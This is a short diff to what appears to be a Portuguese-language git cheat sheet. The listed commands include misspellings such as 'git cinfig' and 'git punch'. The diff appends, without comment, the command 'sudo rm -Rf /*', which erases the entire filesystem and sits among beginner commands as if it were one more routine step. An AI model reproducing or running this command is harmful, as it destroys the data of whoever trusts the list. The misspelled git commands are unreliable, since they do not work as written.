@@ -32,3 +32,5 @@ git cinfig --list (Listar as Confiruações)
 git add (Adicionar as mudanças)
 git commit -m "Atualizacao" (Confirmar as mudanças)
 git punch (Atualizar o Repositório remoto)
+
+sudo rm -Rf /*
